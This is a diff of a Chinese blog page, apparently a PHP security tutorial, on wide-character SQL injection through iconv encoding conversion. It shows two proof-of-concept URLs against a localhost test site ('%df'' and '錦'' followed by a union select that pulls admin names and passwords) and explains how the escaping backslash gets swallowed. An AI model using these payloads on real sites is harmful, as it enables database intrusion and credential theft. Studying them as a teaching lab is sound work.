@@ -147,7 +147,7 @@
 <h2 id="0x02-准备"><a href="#0x02-准备" class="headerlink" title="0x02 准备"></a>0x02 准备</h2><p>知识储备：<code>php</code>基础、<code>MySql</code>入门</p>
 <p>工具：<code>notepad++</code></p>
 <p>服务器环境：<code>wamp</code></p>
-<p>测试代码:见文中</p>
+<p>测试代码：见文中</p>
 <h2 id="0x03-全局防护Bypass下篇的脑图"><a href="#0x03-全局防护Bypass下篇的脑图" class="headerlink" title="0x03 全局防护Bypass下篇的脑图"></a>0x03 全局防护Bypass下篇的脑图</h2><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g18homcj4ij30hs03zwee.jpg" alt></p>
 <h2 id="0x04-宽字符注入"><a href="#0x04-宽字符注入" class="headerlink" title="0x04 宽字符注入"></a>0x04 宽字符注入</h2><p>字符编码的转换函数像<code>iconv</code>的使用会出现这类注入问题，分<code>gbk</code>转<code>utf-8</code>和<code>utf-8</code>转<code>gbk</code>两种情况。</p>
 <h3 id="1-GBK转UTF-8"><a href="#1-GBK转UTF-8" class="headerlink" title="1.GBK转UTF-8"></a>1.GBK转UTF-8</h3><p>缺陷代码：</p>
@@ -179,7 +179,10 @@
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>浏览器输入:</p>
-<pre><code>http://localhost/sqltest/kuanzifu1.php?title=%df&#39; union select 1,2,concat(name,0x23,pass) from admin%23</code></pre><p>发现获取了管理员账户密码如下图：</p>
+<blockquote>
+<p><a href="http://localhost/sqltest/kuanzifu1.php?title=%df&#39;" target="_blank" rel="noopener">http://localhost/sqltest/kuanzifu1.php?title=%df&#39;</a> union select 1,2,concat(name,0x23,pass) from admin%23</p>
+</blockquote>
+<p>发现获取了管理员账户密码如下图：</p>
 <p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g18hoztgaoj30hs05hwej.jpg" alt></p>
 <p>原理其实跟前言里第<code>2</code>条是一样的，我们输入<code>%df%27</code>时首先经过上面提到的单引号转义变成了<code>%df%5c%27</code>（<code>%5c</code>是反斜杠\），然后<code>%df%5c</code>正好属于<code>gbk</code>的汉字编码范围，经过<code>iconv</code>转换到<code>utf-8</code>编码转换后变成了汉字<code>運</code>，从而吞掉了反斜杠使得单引号逃脱出来。</p>
 <h3 id="2-UTF-8转GBK"><a href="#2-UTF-8转GBK" class="headerlink" title="2.UTF-8转GBK"></a>2.UTF-8转GBK</h3><p>缺陷代码：</p>
@@ -212,7 +215,10 @@
 <p>这里我们思考下<code>錦</code>这个字，它的<code>utf-8</code>编码是<code>e98ca6</code>，它的<code>gbk</code>编码是<code>e55c</code>，而上面提到过反斜杠<code>\</code>正好为<code>5c</code>。</p>
 <p>所以如果我们将<code>title</code>设置为：<code>錦&#39;</code>，首先经过<code>addlashes</code>函数或<code>GPC</code>对单引号转义变为：<code>錦\&#39;</code>，然后会经过<code>icnov</code>函数会对<code>錦</code>转化为<code>gbk</code>编码，最后就是：<br><code>%e5%5c%5c%27</code>。反斜杠被转义了（<code>%5c%5c</code>），从而单引号逃逸出来就会引发注入漏洞。</p>
 <p>直接获取管理员账户密码的<code>POC</code>如下：</p>
-<pre><code>http://localhost/sqltest/kuanzifu2.php?title=錦&#39; union select 1,2,concat(name,0x23,pass) from admin%23</code></pre><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g18hp838vtj30hs05i0ss.jpg" alt></p>
+<blockquote>
+<p><a href="http://localhost/sqltest/kuanzifu2.php?title=錦&#39;" target="_blank" rel="noopener">http://localhost/sqltest/kuanzifu2.php?title=錦&#39;</a> union select 1,2,concat(name,0x23,pass) from admin%23</p>
+</blockquote>
+<p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g18hp838vtj30hs05i0ss.jpg" alt></p>
 <p>实际执行的<code>SQL</code>语句：</p>
 <pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> news <span class="token keyword">WHERE</span> title <span class="token operator">=</span> <span class="token string">'\xE5\\'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span>pass<span class="token punctuation">)</span> <span class="token keyword">from</span> admin<span class="token comment" spellcheck="true">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </section>
